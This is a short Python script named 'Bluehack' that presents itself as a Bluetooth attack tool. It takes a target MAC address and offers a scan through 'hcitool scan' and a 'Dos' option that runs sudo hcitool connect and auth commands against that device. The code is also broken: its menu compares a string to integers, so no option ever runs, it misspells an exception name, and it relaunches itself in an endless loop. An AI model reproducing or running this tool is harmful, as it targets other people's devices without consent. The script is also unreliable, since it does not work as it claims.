import time
import sys
import os

def banner():
    print(""" --  |   |    |  -- |   |        ---- | /  """)
    print("""|  | |   |    | |   |   |       |     |/   """)
    print("""| -  |   |    | |-- |---|   /\  |     |\   """)
    print("""|  | |   |    | |   |   |  /--\ |     | \  """)
    print(""" --  |__  ----   -- |   | /    \ ---- |  \ """)
def opt(): # options code
   mac = input("remote mac --> ")
   print("Scan     [ 1 ]")
   print("Dos         [ 2 ]")
   print("exit        [ 3 ]")
   opt = input("[ Bluehack ] --> ")
   if opt == 1:
       listen(mac)
   elif opt == 2:
       send(mac)
   else:
       sys.exit()
def listen(mac): # listen code
    os.system("hcitool scan")
def send(mac): # Dos code
    try:
        os.system("sudo hcitool cc {} ; sudo hcitool auth {}".format(mac, mac))
    except Eception:
        sys.exit()
time.sleep(0.5)
banner()
opt()
os.system("python3 bluehack.py")
